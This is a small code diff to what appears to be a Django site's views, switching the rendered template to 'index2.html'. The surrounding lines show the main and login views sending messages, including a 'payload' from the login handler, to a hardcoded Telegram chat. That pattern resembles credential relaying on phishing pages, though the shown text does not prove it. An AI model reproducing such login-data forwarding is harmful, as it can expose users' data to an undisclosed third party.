@@ -14,7 +14,7 @@ def main(request):
     bot = telegram.Bot(token=bot_token)
     asyncio.run(bot.send_message(124987663, 'main'))
 
-    return render(request, 'main.html', )
+    return render(request, 'index2.html', )
 
 
 def login(request):
@@ -45,4 +45,4 @@ def login(request):
         payload='login'
     bot = telegram.Bot(token=bot_token)
     asyncio.run(bot.send_message(124987663, payload))
-    return render(request, 'main.html')
+    return render(request, 'index2.html')
